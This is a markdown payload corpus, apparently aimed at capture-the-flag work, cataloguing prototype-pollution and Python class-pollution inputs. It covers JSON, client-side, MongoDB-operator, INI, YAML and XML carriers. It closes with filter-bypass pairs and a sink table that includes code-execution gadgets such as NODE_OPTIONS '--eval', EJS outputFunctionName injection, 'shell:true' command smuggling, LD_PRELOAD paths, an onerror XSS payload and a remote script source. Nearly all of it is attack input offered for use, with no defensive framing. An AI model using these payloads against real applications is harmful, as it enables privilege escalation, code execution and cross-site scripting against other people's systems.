# Extended corpus — the long tail of pollution shapes

Beyond the canonical `{"__proto__":{x:1}}`: every carrier×key×sink
combination that has appeared in a real challenge, organized by the
mechanism that makes it work.

---

## 1. The deep-nesting family

```json
{"a":{"b":{"c":{"__proto__":{"m":1}}}}}
{"a":{"b":{"c":{"d":{"__proto__":{"m":1}}}}}}
{"a":{"b":{"c":{"d":{"e":{"__proto__":{"m":1}}}}}}}
{"a":[{"__proto__":{"m":1}}]}
{"a":{"b":[{"__proto__":{"m":1}}]}}
{"a":[{"b":{"__proto__":{"m":1}}}]}
{"a":{"0":{"__proto__":{"m":1}}}}
{"a":{"b":{"c":{"constructor":{"prototype":{"m":1}}}}}}
```

Depth-evasion — a depth-1 key filter misses everything below. The
array-wrapped variants (`[{__proto__}]`) test whether the merge
iterates arrays too (lodash `merge` walks array indices as keys).

## 2. The multi-property family

```json
{"__proto__":{"a":1,"b":2,"c":3,"isAdmin":true,"role":"admin"}}
{"__proto__":{"env":{"NODE_OPTIONS":"x","LD_PRELOAD":"y","PATH":"z"}}}
{"__proto__":{"isAdmin":true},"constructor":{"prototype":{"debug":true}}}
{"__proto__":{"x":{"y":{"z":{"deep":1}}}}}
{"__proto__":{"arr":[1,2,3],"nested":{"a":1},"str":"x","num":1,"bool":true,"null":null}}
```

Type-coverage and multi-write — a single probe writing several
candidate names, or every JS type to learn which land.

## 3. The dual-key family

```json
{"__proto__":{"m":1},"constructor":{"prototype":{"n":2}}}
{"a":{"__proto__":{"m":1}},"b":{"constructor":{"prototype":{"m":2}}}}
{"__proto__":{"m":1},"__proto__":{"m":2}}
{"constructor":{"prototype":{"constructor":{"prototype":{"m":1}}}}}
```

Both aliases in one payload — tests whether the merge walks both
paths; the duplicate-`__proto__` line tests last-write-wins in the
JSON parser.

## 4. The value-type family — what the merge accepts

```json
{"__proto__":{"m":"string"}}
{"__proto__":{"m":123}}
{"__proto__":{"m":1.5}}
{"__proto__":{"m":true}}
{"__proto__":{"m":false}}
{"__proto__":{"m":null}}
{"__proto__":{"m":[]}}
{"__proto__":{"m":[1,2,3]}}
{"__proto__":{"m":{}}}
{"__proto__":{"m":{"nested":1}}}
{"__proto__":{"m":["str",1,true,null,{},[]]}}
{"__proto__":{"m":""}}
{"__proto__":{"m":0}}
{"__proto__":{"m":-1}}
{"__proto__":{"m":1e10}}
{"__proto__":{"m":"{\"nested\":\"string\"}"}}
```

`null` is the interesting one — some merges skip `null`/`undefined`;
falsy values test whether the sink's `||`/`??` check distinguishes.

## 5. The array-target family

```json
{"__proto__":{"0":"x"}}
{"__proto__":{"length":0}}
{"__proto__":{"length":"x"}}
{"arr":{"__proto__":{"0":"x"}}}
{"a":[{"__proto__":{"m":1}}]}
{"[]":{"__proto__":{"m":1}}}
{"__proto__":{"push":"x"}}
{"__proto__":{"concat":"x"}}
{"__proto__":{"indexOf":"x"}}
{"__proto__":{"includes":"x"}}
{"__proto__":{"slice":"x"}}
{"__proto__":{"map":"x"}}
{"__proto__":{"forEach":"x"}}
{"__proto__":{"filter":"x"}}
{"__proto__":{"find":"x"}}
{"__proto__":{"join":"x"}}
{"__proto__":{"flat":"x"}}
{"__proto__":{"reduce":"x"}}
{"__proto__":{"at":"x"}}
{"__proto__":{"sort":"x"}}
{"__proto__":{"fill":"x"}}
{"__proto__":{"keys":"x"}}
{"__proto__":{"values":"x"}}
{"__proto__":{"entries":"x"}}
{"__proto__":{"lastIndexOf":"x"}}
{"__proto__":{"every":"x"}}
{"__proto__":{"some":"x"}}
{"__proto__":{"findIndex":"x"}}
{"__proto__":{"flatMap":"x"}}
{"__proto__":{"reduceRight":"x"}}
{"__proto__":{"pop":"x"}}
{"__proto__":{"shift":"x"}}
{"__proto__":{"unshift":"x"}}
{"__proto__":{"splice":"x"}}
{"__proto__":{"reverse":"x"}}
{"__proto__":{"copyWithin":"x"}}
{"__proto__":{"toString":"x"}}
{"__proto__":{"valueOf":"x"}}
```

`__proto__.0`/`length` don't reach arrays via Object.prototype —
arrays inherit from `Array.prototype` first. To hit array methods
the merge would need to write `arr.__proto__` — a less common path,
but the `{"a":[{"__proto__":...}]}` shape tests whether the merge
recurses INTO array elements.

## 6. The function-target family

```json
{"fn":{"__proto__":{"call":"x"}}}
{"fn":{"__proto__":{"apply":"x"}}}
{"fn":{"__proto__":{"bind":"x"}}}
{"fn":{"__proto__":{"name":"x"}}}
{"fn":{"__proto__":{"length":0}}}
{"fn":{"__proto__":{"prototype":{"m":1}}}}
{"fn":{"constructor":{"prototype":{"m":1}}}}
{"fn":{"prototype":{"m":1}}}
```

A merge into a FUNCTION value — `fn.prototype` is the function's
own `.prototype` property — writable; `fn.constructor` is
`Function` → `Function.prototype` — a different shared root.

## 7. The constructor-chain depth family

```json
{"constructor":{"prototype":{"m":1}}}
{"constructor":{"prototype":{"__proto__":{"m":1}}}}
{"constructor":{"prototype":{"constructor":{"prototype":{"m":1}}}}}
{"constructor":{"constructor":{"prototype":{"m":1}}}}
{"a":{"constructor":{"prototype":{"m":1}}}}
{"a":{"b":{"constructor":{"prototype":{"m":1}}}}}
{"0":{"constructor":{"prototype":{"m":1}}}}
{"0":{"0":{"constructor":{"prototype":{"m":1}}}}}
{"x":{"constructor":{"prototype":{"y":{"__proto__":{"m":1}}}}}}
```

`obj.constructor` → `Object` → `.prototype` → `Object.prototype`;
`constructor.constructor` → `Function` → `.prototype` →
`Function.prototype` — a DIFFERENT root with different names
(`call`, `apply`, `bind`, `name`, `length`).

## 8. The special-name corpus (the shadow set)

```json
{"__proto__":{"toString":"x"}}
{"__proto__":{"valueOf":"x"}}
{"__proto__":{"constructor":"x"}}
{"__proto__":{"hasOwnProperty":"x"}}
{"__proto__":{"isPrototypeOf":"x"}}
{"__proto__":{"propertyIsEnumerable":"x"}}
{"__proto__":{"toLocaleString":"x"}}
{"__proto__":{"toJSON":"x"}}
{"__proto__":{"inspect":"x"}}
{"__proto__":{"then":"x"}}
{"__proto__":{"catch":"x"}}
{"__proto__":{"finally":"x"}}
{"__proto__":{"Symbol(Symbol.toPrimitive)":"x"}}
{"__proto__":{"Symbol(Symbol.iterator)":"x"}}
{"__proto__":{"Symbol(Symbol.asyncIterator)":"x"}}
{"__proto__":{"Symbol(Symbol.hasInstance)":"x"}}
{"__proto__":{"Symbol(Symbol.toStringTag)":"x"}}
{"__proto__":{"Symbol(Symbol.species)":"x"}}
{"__proto__":{"[Symbol.iterator]":"x"}}
{"__proto__":{"@@iterator":"x"}}
{"__proto__":{"@@toPrimitive":"x"}}
{"__proto__":{"@@toStringTag":"x"}}
{"__proto__":{"@@species":"x"}}
{"__proto__":{"@@hasInstance":"x"}}
{"__proto__":{"@@asyncIterator":"x"}}
{"__proto__":{"__proto__":null}}
{"__proto__":{"__defineGetter__":"x"}}
{"__proto__":{"__defineSetter__":"x"}}
{"__proto__":{"__lookupGetter__":"x"}}
{"__proto__":{"__lookupSetter__":"x"}}
{"__proto__":{"get":"x"}}
{"__proto__":{"set":"x"}}
{"__proto__":{"_":"x"}}
{"__proto__":{"$":"x"}}
{"__proto__":{"constructor":{"prototype":{"toString":"x"}}}}
```

`toString`/`valueOf` shadow the coercion methods — every `obj+""`/
`String(obj)`/template-literal read of ANY object breaks or runs
your value — a crash-primitive mostly, a coercion-gadget when the
sink stringifies. `toJSON`/`inspect`/`then`/`Symbol.*` are the
call-target hijacks.

## 9. The `for..in` enumeration corpus

```json
{"__proto__":{"enumerable":"x"}}
{"__proto__":{"enumerable":true}}
{"__proto__":{"a":1,"b":2,"c":3}}
{"__proto__":{"z_last_key":"x"}}
{"__proto__":{"0":"x","1":"y","2":"z"}}
{"__proto__":{"length":3}}
{"__proto__":{"keys":"x"}}
{"__proto__":{"values":"x"}}
{"__proto__":{"entries":"x"}}
{"__proto__":{"forEach":"x"}}
{"__proto__":{"[Symbol.iterator]":"f"}}
```

A polluted enumerable property enters every unfiltered `for..in` —
the secondary-carrier primitive. The name list tests which names
iterate (enumerable:true defaults on literal writes).

## 10. The Python-side corpus

```python
# the JSON body that a python merge walks
{"__class__": {"x": 1}}
{"__class__": {"is_admin": True}}
{"__init__": {"__globals__": {"SECRET": "x"}}}
{"a": {"__class__": {"x": 1}}}
{"a": {"__class__": {"__init__": {"__globals__": {"k": "v"}}}}}
{"__dict__": {"x": 1}}
{"__dict__": {"is_admin": True}}
{"__bases__": [{"x": 1}]}
{"__mro__": [{"x": 1}]}
{"__qualname__": "x"}
{"__name__": "x"}
{"__module__": "x"}
{"__doc__": "x"}
{"__annotations__": {"x": 1}}
{"__slots__": ["x"]}
{"__hash__": "x"}
{"__getattr__": "x"}
{"__setattr__": "x"}
{"__delattr__": "x"}
{"__getattribute__": "x"}
{"__get__": "x"}
{"__set__": "x"}
{"__delete__": "x"}
{"__call__": "x"}
{"__init__": "x"}
{"__new__": "x"}
{"__init_subclass__": "x"}
{"__subclasshook__": "x"}
{"__reduce__": "x"}
{"__reduce_ex__": "x"}
{"__getstate__": "x"}
{"__setstate__": "x"}
{"__repr__": "x"}
{"__str__": "x"}
{"__eq__": "x"}
{"__ne__": "x"}
{"__lt__": "x"}
{"__le__": "x"}
{"__gt__": "x"}
{"__ge__": "x"}
{"__contains__": "x"}
{"__iter__": "x"}
{"__len__": "x"}
{"__getitem__": "x"}
{"__setitem__": "x"}
{"__delitem__": "x"}
{"__enter__": "x"}
{"__exit__": "x"}
{"__get__": "x"}
{"__set_name__": "x"}
{"__subclasses__": "x"}
{"__subclass__": "x"}
{"__globals__": {"SECRET_KEY": "x"}}
{"__globals__": {"DEBUG": True}}
{"__globals__": {"FLAG": "x"}}
{"__globals__": {"os": {"environ": {"X": "1"}}}}
{"__builtins__": {"x": 1}}
{"__import__": "x"}
{"__loader__": "x"}
{"__spec__": "x"}
{"__package__": "x"}
{"__file__": "x"}
{"__path__": "x"}
{"__cached__": "x"}
{"__all__": ["x"]}
{"__version__": "x"}
{"__author__": "x"}
{"os": {"environ": {"FLAG_READ": "1"}}}
{"os": {"environ": {"PYTHONPATH": "/tmp"}}}
{"os": {"environ": {"LD_PRELOAD": "/tmp/x.so"}}}
{"os": {"environ": {"PATH": "/tmp"}}}
{"config": {"SECRET_KEY": "x"}}
{"config": {"DEBUG": True}}
{"settings": {"FLAG": "x"}}
{"app": {"config": {"SECRET": "x"}}}
{"request": {"__class__": {"x": 1}}}
{"session": {"__class__": {"is_admin": True}}}
{"user": {"__class__": {"role": "admin"}}}
{"self": {"__class__": {"verified": True}}}
{"this": {"__class__": {"admin": True}}}
{"env": {"FLAG": "x"}}
{"environ": {"FLAG": "x"}}
{"flask": {"app": {"config": {"x": 1}}}}
{"django": {"conf": {"settings": {"x": 1}}}}
```

## 11. The client-side corpus

```js
// location.hash carriers
#{"__proto__":{"src":"https://a/x.js"}}
#{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}
#{"__proto__":{"ADD_TAGS":["script"],"ADD_ATTR":["onerror"]}}
#{"config":{"__proto__":{"url":"https://a/"}}}

// postMessage carriers
window.postMessage({"__proto__":{"m":1}},"*")
window.postMessage({"settings":{"__proto__":{"src":"https://a"}}},"*")

// localStorage carriers
localStorage.setItem('cfg','{"__proto__":{"src":"https://a"}}')
sessionStorage.setItem('opts','{"__proto__":{"html":"<img>"}}')
document.cookie='cfg={"__proto__":{"x":1}}'

// URL-param JSON
?config=%7B%22__proto__%22%3A%7B%22x%22%3A1%7D%7D
?opts={"__proto__":{"src":"x"}}
```

## 12. The $-operator corpus (document-store)

```json
{"$rename":{"a":"__proto__.m"}}
{"$rename":{"a":"constructor.prototype.m"}}
{"$rename":{"a":"__proto__.isAdmin"}}
{"$rename":{"bio":"__proto__.role"}}
{"$rename":{"profile.bio":"__proto__.x"}}
{"$set":{"__proto__.m":1}}
{"$set":{"a.__proto__.m":1}}
{"$set":{"constructor.prototype.m":1}}
{"$unset":{"__proto__.x":1}}
{"$unset":{"constructor.prototype.x":1}}
{"$inc":{"__proto__.n":1}}
{"$mul":{"__proto__.n":2}}
{"$min":{"__proto__.n":1}}
{"$max":{"__proto__.n":1}}
{"$push":{"__proto__.arr":1}}
{"$addToSet":{"__proto__.arr":1}}
{"$pull":{"__proto__.arr":1}}
{"$pop":{"__proto__.arr":1}}
{"$setOnInsert":{"__proto__.m":1}}
{"$currentDate":{"__proto__.d":true}}
{"$bit":{"__proto__.n":{"and":1}}}
{"$push":{"__proto__.arr":{"$each":[1,2,3]}}}
{"$addToSet":{"__proto__.arr":{"$each":[1]}}}
{"$set":{"__proto__":{"m":1}}}
{"$set":{"profile.__proto__":{"m":1}}}
{"$set":{"a":{"__proto__":{"m":1}}}}
{"$merge":{"into":"__proto__.x"}}
{"$out":"__proto__.x"}
{"$project":{"x":"__proto__.y"}}
{"$addFields":{"__proto__.m":"$bio"}}
{"$setFields":{"__proto__.m":"$bio"}}
{"$unset":"__proto__.x"}
{"$replaceRoot":{"newRoot":"$__proto__"}}
{"$replaceWith":"$__proto__"}
{"$group":{"_id":"$__proto__.m"}}
{"$lookup":{"from":"x","localField":"__proto__.m","foreignField":"_id","as":"x"}}
{"$graphLookup":{"startWith":"$__proto__.m"}}
{"$facet":{"x":[{"$project":{"__proto__.m":1}}]}}
{"$bucket":{"groupBy":"$__proto__.m","boundaries":[0,1]}}
{"$sort":{"__proto__.m":1}}
{"$match":{"__proto__.m":1}}
{"$where":"this.__proto__.m"}
{"$expr":{"$eq":["$__proto__.m",1]}}
{"$geoNear":{"near":[0,0],"key":"__proto__.m"}}
{"$text":{"$search":"x","$field":"__proto__.m"}}
{"$cond":{"if":"$__proto__.m","then":1,"else":0}}
{"$switch":{"branches":[{"case":"$__proto__.m","then":1}]}}
{"$let":{"vars":{"x":"$__proto__.m"},"in":"$$x"}}
{"$map":{"input":"$a","as":"x","in":"$$x.__proto__.m"}}
{"$filter":{"input":"$a","cond":"$$this.__proto__.m"}}
{"$reduce":{"input":"$a","initialValue":0,"in":"$$value.__proto__.m"}}
{"$arrayElemAt":["$__proto__.arr",0]}
{"$getField":{"field":"__proto__.m","input":"$$ROOT"}}
{"$setField":{"field":"__proto__.m","input":"$$ROOT","value":1}}
{"$unsetField":{"field":"__proto__.m","input":"$$ROOT"}}
```

## 13. The INI/env/config-file carrier corpus

```ini
[__proto__]
m=1
[a.__proto__]
m=1
[constructor.prototype]
m=1
__proto__.m=1
a.b.__proto__.m=1
```

```bash
# env-var JSON
X={"__proto__":{"m":1}}
CONFIG={"__proto__":{"m":1}}
SETTINGS__a__b={"__proto__":{"m":1}}
```

`ini`-parser PP (CVE-2020-7712) — `a[__proto__]=x` and
`[__proto__]` section names in a parsed INI file.

## 14. The YAML/XML carrier corpus

```yaml
__proto__:
  m: 1
a:
  __proto__:
    m: 1
constructor:
  prototype:
    m: 1
```

```xml
<root><__proto__><m>1</m></__proto__></root>
<root><a><__proto__><m>1</m></__proto__></a></root>
<root __proto__.m="1"/>
```

YAML/XML carriers parse to objects — then a JS merge walks them.
The YAML `__proto__:` key becomes the JSON `{"__proto__":...}` —
same sink, different serialization.

## 15. The "the filter checked X, send Y" pairs

```text
filter '__proto__'           → constructor.prototype
filter 'constructor'         → __proto__ (or nested constructor)
filter both                  → proto / prototype / \u escapes
filter depth-1               → a.__proto__
filter name-only             → __proto__%00 / __proto__\n / spaces
schema strips unknown keys   → nest inside an allowed container
merge uses defineProperty    → constructor.prototype (read-chain)
merge uses Object.create(null)→ a DIFFERENT merge target
sink reads hasOwnProperty    → find a chain-read sink
sink is a Map                → find a plain-object sink
frozen Object.prototype      → Array.prototype/Function.prototype
                               /class protos
qs allowPrototypes           → JSON body / constructor / path-API
process-per-request          → second-order (stored) write
```

## 16. The "harmless marker" corpus by sink

```text
authz read           → {"__proto__":{"isAdmin":true}} + gated route
template output      → outputFunctionName:"x;__append('PP');var y"
env read             → env.NODE_OPTIONS:"--eval 'console.error(1)'"
spawn                → shell:true + `;echo PP`
require              → main:"/tmp/x.js" that writes a marker
url                  → url:"http://marker/"; hit the OOB listener
config               → debug:true; read the verbosity change
toJSON               → toJSON:"function(){return'PP'}" + stringify
then                 → then:"function(r){r('PP')}" + await
constructor          → constructor:"x" + obj.constructor read
client src           → src:"https://a/x.js" + the script load
sanitizer            → ADD_TAGS:["script"] + sanitized output
python globals       → __globals__.FLAG:"x" + module read
python environ       → os.environ.X:"1" + env-read endpoint
class attr           → __class__.is_admin:True + fresh instance read
```
